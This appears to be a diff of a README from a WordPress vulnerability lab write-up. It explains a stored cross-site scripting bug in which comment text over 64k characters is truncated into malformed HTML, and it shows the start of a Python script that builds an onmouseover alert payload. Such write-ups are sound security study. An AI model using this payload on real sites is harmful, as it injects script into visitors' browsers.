@@ -16,7 +16,7 @@ Time spent: **10** hours spent in total
     - <img src="https://github.com/Lukanite/CP_wpvulns/raw/master/1.gif">
   - [ ] Steps to recreate: 
     - Create an "<a>" tag longer than 64k in a comment, which upon truncation renders as malformed HTML. Browsers try to fix this which leads to interpretation of the onmouseover exploit.
-    - Sample exploit generator:
+    - Sample exploit generator (Python):
     ```python
     out = "<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  "
     for x in range(64*1024):
